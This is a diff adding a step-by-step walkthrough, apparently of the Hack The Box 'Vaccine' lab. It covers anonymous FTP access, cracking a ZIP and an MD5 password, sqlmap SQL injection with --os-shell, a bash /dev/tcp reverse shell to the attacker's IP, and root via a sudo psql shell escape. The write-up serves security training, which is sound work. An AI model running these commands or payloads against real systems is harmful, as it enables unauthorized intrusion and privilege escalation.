@@ -283,15 +283,217 @@ java -jar burpsuite_community_v2024.1.1.jar
    ```bash
 
    ftp -4 10.129.159.234 -v -a
-
    ```
    
     ![scan port](./image/Task3_ftp.jpg)
-   
-   
-   
-   
 
+    We login in anonymously and used ls to list files and found backup.zip
+   
+   
+3.  Use 'GET' command to download the backup.zip and type 'BYE' to exit the ftp enviornment.
 
-     
+    ```bash
+    # download the backup file
+    get backup.zip
+
+    #exits the ftp enviornment
+    bye
+    ```
     
+4.  We found that attmpting to unzip shows it is password-protected
+
+    We need to crack the ZIP password , therefore, we can user john-the-ripper
+
+    We generate the has using zip2john
+
+    ```bash
+
+    /snap/john-the-ripper/695/bin/zip2john backup.zip > backup.hash
+
+    ```
+
+    crack password with John the Ripper:
+
+     ```bash
+
+     john --format=pkzip --wordlist=rockyou.txt backup.hash
+
+      ```
+
+     ![scan port](./image/Task3_john.jpg)
+
+    
+     We found the password: 741852963
+    
+
+6. We found the unzip password so we use the password to unzip the file and analyze index.php
+
+   ```bash
+
+   #unzip the zip file
+   unzip -P 741852963 backup.zip
+
+   #look at the index.php
+   cat index.php
+   
+   ```
+
+   From the index.php , we can see:
+
+   ```bash
+
+   if ($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3")
+
+   ```
+   
+7. We need to use Hashcat to crack MD5 hash, we use Hashcat it is password-cracking tool designed to crack hashed passwords.
+
+   ```bash
+   
+   hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --force
+
+   ```
+
+   Hash: 2cb42f8734ea607eefed3b70af13bbd3
+
+   password: qwerty789
+
+8. Now we open the website by using http://10.129.159.234/
+
+   We need to type the login username and password for this website.
+
+    ![scan port](./image/Task3_mega.jpg)
+
+   By the steps we know that the Username: admin , and password: qwerty789
+   
+   And we log in successfully.
+
+   ![scan port](./image/Task3_catalogue.jpg)
+
+   
+9. The url of this website is http://10.129.159.234/dashboard.php?search=Elixir
+
+    If search = xxx which means that the search function is directly using the input in a backend SQL query , so we need to use SQL injection.
+
+   
+10. Get the valid cookie using Burp Suite: PHPSESSID=u9hq979p09io4hvqv95ruaorfj
+   
+   
+11. We use SQL map for OS Command injection:
+
+    initial SQLMap test:
+
+    ```bash
+
+    # level 5: the maximum level of the test is level 5
+    #risk 3 : set the risk
+    #--random-agent : use a random user-agent string
+    
+    sqlmap -u "http://10.129.159.234/dashboard.php?search=test" \
+--cookie="PHPSESSID=u9hq979p09io4hvqv95ruaorfj" \
+--level=5 --risk=3 --random-agent --batch
+
+   ```
+
+   Use the OS shell inhection with SQL map:
+
+   ```bash
+
+   sqlmap -u "http://10.129.159.234/dashboard.php?search=test" \
+--cookie="PHPSESSID=u9hq979p09io4hvqv95ruaorfj" \
+--os-shell \
+--level=5 --risk=3 --batch --random-agent
+
+    ```
+
+12. We open another terminal to listen onlocal machine:
+
+    ```bash
+
+    sudo nc -lvnp 443
+
+    ```
+
+13. From SQLMap shell , run reverse shell payload:
+
+   ```bash
+
+    # 10.10.14.252 is our target machine
+    # 443 is our linstener port
+    bash -c "bash -i >& /dev/tcp/10.10.14.252/443 0>&1"
+
+    ```
+    
+
+14. reverse shell successfully received:
+
+   ```bash
+
+   sudo nc -lvnp 4444
+
+    ```
+
+    Response:
+
+   ```bash
+
+   Connection received on 10.129.159.234
+   bash: no job control in this shell
+   postgres@vaccine:~$
+
+   ```
+
+   This means that it connect successfully. Now we got the shell of the target machine.
+
+   
+15. Use cd and ls home and it shows two files: One is 'postgres' and theother one is 'vaccine'.
+
+    I tried to cd/home/vaccine and type ls to find any files inside.
+
+    And found the user.txt inside the vaccine files, i use 'CAT' to read the user flag.
+
+     ![scan port](./image/Task3_getUser.jpg)
+
+16. Now we got the user flag, we need to think how to get root flag.
+
+    We need to check what this user can do with sudo:
+
+    ```bash
+    sudo -l
+    ```
+
+    Response:
+    
+    ```bash
+    User postgres may run the following commands on vaccine:
+    (ALL) NOPASSWD: /usr/bin/psql
+    ```
+
+    This means the postgres can run as root without the password
+
+17. Escape to shell via psql
+
+    We run psql as root , this is to break out of psql and get the root shell
+
+    ```bash
+    sudo /usr/bin/psql
+    ```
+
+   Response:
+   
+   ```bash
+   \! /bin/bash
+   ```
+
+   This means that psql let me run shell command and since i;m running psql with sudo , this give me the root shell.
+
+18.  Therefore, similar to getting user flag:
+
+     ```bash
+     cd /root
+     ls
+     cat root.txt
+     ```
+
+     We get the root flag.
+      ![scan port](./image/Task3_getRoot.jpg)
